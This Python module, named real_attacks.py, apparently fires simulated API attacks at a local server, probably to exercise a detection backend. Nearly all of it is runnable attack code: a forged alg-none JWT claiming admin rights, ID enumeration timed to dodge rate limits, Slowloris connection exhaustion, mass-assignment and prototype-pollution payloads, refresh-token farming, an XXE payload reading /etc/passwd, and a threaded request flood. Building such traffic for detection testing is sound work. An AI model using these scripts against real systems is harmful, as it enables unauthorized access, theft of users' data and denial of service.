# backend/attack/real_attacks.py
import requests, time, threading, base64, json, random

BASE = "http://localhost:8000"

# ── 1. JWT ALG:NONE ATTACK (CVE-2015-9235) ────────────────────
def jwt_alg_none_attack():
    """
    Real attack: strip JWT signature, change alg to 'none'
    Bypasses verification on vulnerable servers
    """
    # Build a fake unsigned JWT
    header  = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"sub":"admin","role":"superuser","iat":9999999999}).encode()
    ).rstrip(b"=").decode()
    forged_jwt = f"{header}.{payload}."  # empty signature

    for _ in range(30):
        requests.get(f"{BASE}/api/admin",
            headers={"Authorization": f"Bearer {forged_jwt}"})
        time.sleep(0.1)
    print("[ATTACK] JWT alg:none fired — forged admin token")


# ── 2. BOLA / IDOR (OWASP API #1) ────────────────────────────
def bola_attack(start=1, end=500):
    """
    Real attack: enumerate object IDs to access other users' data
    Sequential pattern is the tell — normal users never hit 500 IDs
    """
    token = "valid_user_token_123"
    for user_id in range(start, end):
        requests.get(
            f"{BASE}/api/users/{user_id}",
            headers={"Authorization": f"Bearer {token}"}
        )
        time.sleep(0.02)  # slow enough to avoid rate limit
    print(f"[ATTACK] BOLA: enumerated /api/users/1 → /api/users/{end}")


# ── 3. SLOW LORIS (connection exhaustion) ─────────────────────
def slowloris_attack(connections=50):
    """
    Real attack: hold HTTP connections open with partial headers
    Never completes the request — exhausts server thread pool
    """
    import socket
    sockets = []
    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("localhost", 8000))
            # Send partial HTTP header — never send \r\n\r\n to complete it
            s.send(b"GET /login HTTP/1.1\r\nHost: localhost\r\nX-Custom: ")
            sockets.append(s)
        except: pass

    print(f"[ATTACK] Slowloris: {len(sockets)} connections held open")
    time.sleep(10)
    for s in sockets: s.close()


# ── 4. MASS ASSIGNMENT ATTACK ─────────────────────────────────
def mass_assignment_attack():
    """
    Real attack: inject privileged fields in POST body
    Tests if API blindly assigns all incoming JSON fields
    """
    payloads = [
        {"username":"attacker","password":"pass","role":"admin","is_verified":True},
        {"username":"hacker","balance":999999,"subscription":"enterprise"},
        {"email":"x@x.com","__proto__":{"admin":True}},  # prototype pollution
    ]
    for p in payloads:
        requests.post(f"{BASE}/api/register", json=p)
        time.sleep(0.3)
    print("[ATTACK] Mass assignment: injected admin fields in registration")


# ── 5. TOKEN REFRESH ABUSE ────────────────────────────────────
def token_refresh_abuse():
    """
    Real attack: hammer /refresh endpoint to farm tokens
    Legitimate use: call once. Attack: call 200x/minute
    """
    refresh_token = "rt_valid_but_abused_xyz987"
    tokens_farmed = []
    for _ in range(150):
        r = requests.post(f"{BASE}/api/refresh",
            json={"refresh_token": refresh_token})
        if r.status_code == 200:
            tokens_farmed.append(r.json().get("access_token"))
        time.sleep(0.02)
    print(f"[ATTACK] Token refresh abuse: farmed {len(tokens_farmed)} tokens")


# ── 6. XXE INJECTION ─────────────────────────────────────────
def xxe_injection_attack():
    """
    Real attack: XML External Entity injection
    Tries to read server files via entity expansion
    """
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""
    for _ in range(20):
        requests.post(f"{BASE}/api/import",
            data=xxe_payload,
            headers={"Content-Type":"application/xml"})
        time.sleep(0.2)
    print("[ATTACK] XXE injection: tried /etc/passwd via entity expansion")

def rate_flood_attack(total=200, workers=20):
    from concurrent.futures import ThreadPoolExecutor
    def _send(i: int):
        try:
            requests.get(f"{BASE}/test", timeout=3)
            return True
        except Exception:
            return False
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        executor.map(_send, range(total))
    print(f"[ATTACK] Rate flood: sent {total} requests")
